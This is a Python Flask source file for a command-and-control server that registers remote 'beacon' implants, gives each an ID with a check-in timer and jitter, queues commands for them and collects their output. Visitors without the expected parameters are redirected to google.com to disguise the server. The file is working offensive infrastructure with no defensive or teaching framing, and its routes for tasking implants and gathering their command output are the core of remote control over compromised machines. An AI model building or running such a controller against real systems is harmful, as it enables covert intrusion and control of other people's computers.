from flask import Flask, request, jsonify
import uuid
import random
import time
import logging
from Modules.global_objects import beacons, add_beacon_list, beacon_commands

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route('/connection', methods=['GET'])
def connection():
    name = request.args.get('name')
    os = request.args.get('os')
    address = request.args.get('address')

    if name and os and address:
        userID = str(uuid.uuid4())
        add_beacon_list(userID, address, name, os, time.asctime(), 5, 10)
        return {"timer": 5, "uuid": userID, "jitter": 10}, 200
    else:
        return Flask.redirect("https://www.google.com", code=302)

@app.route('/beacon', methods=['GET'])
def beacon():
    data = {}
    id = request.args.get('id')
    if not id:
        return '', 400
    
    user_ids = beacons.get("uuid", [])
    for i, beacon_id in enumerate(user_ids):
        if beacon_id == id:
            beacons["last_beacon"][i] = time.asctime()
            timer = beacons["timer"][i]
            # POC to make sure this works
            # if random.randint(0, 1):
            #     timer = random.randint(5, 25)
            #     beacons["timer"][i] = timer
            #     data["timer"] = timer
            next_beacon_time = time.time() + timer
            beacons["next_beacon"][i] = time.asctime(time.localtime(next_beacon_time))

    for j in range(len(beacon_commands["beacon_uuid"])):
        if beacon_commands["executed"][j]:
            continue
        if beacon_commands["beacon_uuid"][j] == id:
            data["command_uuid"] = beacon_commands["command_uuid"][j]
            data["command"] = beacon_commands["command"][j]
            beacon_commands["executed"][j] = True    

    if not data:
        data["none"] = "none"
    return jsonify(data), 200


@app.route('/response', methods=['POST'])
def response():
    cid = request.args.get('cid')
    output = request.get_json().get('output', '')

    found = False
    for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
        if cid == command_uuid:
            found = True
            if i < len(beacon_commands["executed"]):
                beacon_commands["command_output"].append(output)
                print(f"Command {beacon_commands['beacon_uuid'][i]} responded with:")
                print(f"Command: {beacon_commands['command_output'][i]}")
            else:
                print(f"Index {i} out of range for {beacon_commands['executed']}")
    if not found:
        return '', 500
    return '', 200
